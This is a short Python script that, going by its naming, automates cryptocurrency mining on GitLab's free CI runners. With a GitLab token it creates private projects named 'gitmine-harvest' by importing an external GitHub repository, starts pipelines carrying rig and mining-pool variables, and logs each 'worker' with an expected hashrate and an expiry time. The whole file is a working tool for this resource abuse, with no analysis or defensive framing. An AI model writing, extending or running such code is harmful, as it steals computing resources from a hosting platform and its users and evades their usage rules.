#!/usr/bin/env python3
import requests, time, os
from datetime import datetime, timedelta

class GitlabCiEnroller:
    BASE = 'https://gitlab.com/api/v4'
    def __init__(self):
        self.token = os.environ.get('GITLAB_TOKEN','')
        self.headers = {'PRIVATE-TOKEN':self.token}
    def enroll(self, count, platform, secrets=None):
        workers = []
        if not self.token: print('[gitlab] token not set'); return workers
        for i in range(count):
            name = f'gitmine-harvest-{int(time.time())}-{i}'
            rig  = f'gl-{name}'
            try:
                r = requests.post(f'{self.BASE}/projects',headers=self.headers,
                    json={'name':name,'visibility':'private','import_url':'https://github.com/Ox518/genFre'})
                if r.status_code not in (200,201): continue
                pid = r.json()['id']
                time.sleep(10)
                requests.post(f'{self.BASE}/projects/{pid}/pipeline',headers=self.headers,
                    json={'ref':'main','variables':[
                        {'key':'RIG_ID','value':rig},{'key':'POOL_REPO','value':'Ox518/genFre'},
                        {'key':'ALGO','value':'auto'}]})
                workers.append({'id':rig,'algo':'auto','hashrate':'~40KH/s',
                    'expires_at':(datetime.utcnow()+timedelta(minutes=60)).isoformat()+'Z',
                    'url':f'https://gitlab.com/{name}/-/pipelines'})
            except Exception as e: print(f'[gitlab] error: {e}')
            time.sleep(5)
        return workers
